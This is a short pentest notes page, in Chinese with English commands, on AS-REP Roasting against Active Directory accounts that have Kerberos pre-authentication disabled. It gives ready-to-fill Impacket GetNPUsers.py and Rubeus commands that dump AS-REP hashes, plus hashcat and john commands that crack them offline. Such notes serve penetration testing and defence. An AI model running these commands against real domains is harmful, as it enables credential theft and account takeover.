---
title: "AS-REP Roasting"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:38:01+08:00
draft: false
---

如果用户开启了“不使用[Kerberos]({{< relref "kerberos.md" >}})预认证”，攻击者就可以获取到 Kerberos AS-REP，经过用
户的 RC4-HMAC 密码加密过的，然后他就可以离线破解这个凭证了

With Impacket example GetNPUsers.py:

```bash
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

With Rubeus:

```bash
# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
```

Cracking with dictionary of passwords:

```bash
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>
```

几种攻击手法的区别：

-   AS-REP Roasting：获取用户 hash 然后离线暴力破解
-   [Kerberoasting]({{< relref "kerberoasting.md" >}})：获取应用服务 hash 然后暴力破解
-   黄金票据：通过假冒域中不存在的用户来访问应用服务
